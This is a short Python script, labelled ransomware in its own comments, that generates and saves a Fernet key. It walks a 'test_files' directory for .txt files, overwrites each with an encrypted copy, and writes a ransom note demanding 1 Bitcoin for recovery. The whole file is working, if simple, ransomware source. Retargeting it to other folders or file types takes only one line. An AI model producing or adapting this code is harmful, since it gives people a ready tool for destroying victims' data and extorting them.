from cryptography.fernet import Fernet
import os

#1. Gerate a key for encryption
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

#2. Load the key
def load_key():
    return open("secret.key", "rb").read()

#3. Encrypt a file
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, "rb") as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted)

#4. Search for files to encrypt 
def search_files(directory, extension):
    files = []
    for root, dirs, filenames in os.walk(directory):
        for filename in filenames:
            if filename.endswith(extension):
                files.append(os.path.join(root, filename))
    return files

#5. Message to display after encryption
def display_message():
  with open("ransom_note.txt", "w") as note:
    note.write("Your files have been encrypted. To recover them, send 1 Bitcoin to the following address: [Bitcoin Address].")

#6. Main function to execute the ransomware
def main():
    # Generate and load the encryption key
    generate_key()
    key = load_key()
    files = search_files("test_files", ".txt")
    for file in files:
        encrypt_file(file, key)
    display_message()
    print("Encryption complete. Ransom note created.")

if __name__ == "__main__":
    main()